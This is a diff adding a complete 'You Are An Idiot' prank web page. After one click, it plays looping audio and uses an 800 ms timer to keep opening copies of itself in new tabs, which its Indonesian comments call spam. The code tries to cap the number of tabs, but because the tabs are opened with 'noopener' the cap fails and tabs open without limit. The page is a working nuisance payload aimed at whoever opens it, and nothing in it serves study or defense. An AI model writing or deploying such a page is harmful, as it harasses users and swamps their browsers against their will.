@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>You Are An Idiot</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: white;
+      overflow: hidden;
+      height: 100%;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    img {
+      max-width: 100vw;
+      max-height: 100vh;
+      object-fit: contain;
+      cursor: pointer;
+    }
+
+    @media (orientation: landscape) {
+      img {
+        width: 90vw;
+        height: 100vh;
+        object-fit: cover;
+      }
+    }
+
+    audio {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="smiley.gif" alt="You Are An Idiot" id="smiley" />
+
+  <audio id="idiotAudio" loop>
+    <source src="idiot.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+  const img = document.getElementById("smiley");
+  const audio = document.getElementById("idiotAudio");
+
+  let wins = [];
+  let autoTimer = null;
+  const MAX_TABS = 5;      // jumlah tab aktif
+  const INTERVAL = 800;    // lebih cepat spam (ms)
+
+  function openChild() {
+    const w = window.open(location.href, "_blank", "noopener");
+    if (!w) {
+      console.log("Popup diblokir browser");
+      return;
+    }
+    wins.push(w);
+    if (wins.length > MAX_TABS) {
+      const oldest = wins.shift();
+      try { if (oldest && !oldest.closed) oldest.close(); } catch(e){}
+    }
+  }
+
+  img.addEventListener("click", () => {
+    audio.play(); // mainkan lagu di tab utama
+    if (!autoTimer) {
+      openChild(); // buka tab pertama
+      autoTimer = setInterval(openChild, INTERVAL); // lanjut spam otomatis
+    }
+  });
+</script>
+
+</body>
+</html>
